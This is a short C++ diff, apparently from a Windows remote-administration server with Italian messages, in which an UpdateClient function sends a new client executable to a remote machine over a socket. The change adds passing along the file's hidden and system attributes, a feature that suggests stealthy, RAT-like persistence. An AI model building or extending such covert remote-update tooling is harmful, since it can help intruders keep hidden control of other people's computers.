@@ -347,14 +347,24 @@ bool Reboot(SOCKET Sock, int ID)
 short UpdateClient(SOCKET Sock, int ID)
 {
     DirUtils du;
+    bool Hidden = false;
+    bool System = false;
+    DWORD Attr;
 
     string FilePath = du.ChoseFileDialog("Client\0*.exe\0", du.GetModuleFilePath().c_str());
 
     if (FilePath == "")
         return 1;
 
+    Attr = GetFileAttributesA(FilePath.c_str());
+    if (Attr != -1)
+    {
+        Hidden = ((Attr & FILE_ATTRIBUTE_HIDDEN) == FILE_ATTRIBUTE_HIDDEN);
+        System = ((Attr & FILE_ATTRIBUTE_SYSTEM) == FILE_ATTRIBUTE_SYSTEM);
+    }
+
     cout << "Invio file in corso..." << endl;
-    if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath)))
+    if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath), Hidden, System))
     {
         cout << "File inviato." << endl;
         Sleep(1000);
